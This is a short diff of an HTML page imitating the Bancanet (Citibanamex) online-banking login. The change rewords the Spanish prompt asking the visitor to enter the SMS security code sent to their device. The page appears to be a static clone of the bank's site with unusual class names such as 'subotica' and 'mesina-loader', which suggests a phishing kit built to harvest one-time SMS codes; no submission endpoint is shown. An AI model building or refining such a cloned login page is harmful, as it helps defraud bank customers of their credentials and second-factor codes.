@@ -1045,7 +1045,7 @@
 									<div style="     font-size: 15px !important; 
     width: 60% !important;
 }" _ngcontent-c29="" class="wizard-step-content-title">
-										<span _ngcontent-c29="" >Hemos enviado un código SMS a tu dispositivo por seguridad. Ingresa el código para continuar.</span>
+										<span _ngcontent-c29="" >Es momento de utilizar su dispositivo de seguridad, ingrese el código de SMS enviado.</span>
 									</div>  </center>
 									<icb-login-step-user _ngcontent-c29="" _nghost-c35=""><div  class="wizardAutoHeightModeX ng-pristine ng-invalid ng-touched">
     <div _ngcontent-c35="" class="subotica">
@@ -4200,3 +4200,4 @@
 
 <!---->
 </icb-app><div class="app_overlay"><div class="mesina-loader"><div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div class="mesina-welcome-title">Bienvenido a Bancanet</div><div class="mesina-welcome-subtitle1">Por favor espere un momento...</div></div></div></body></html>
+
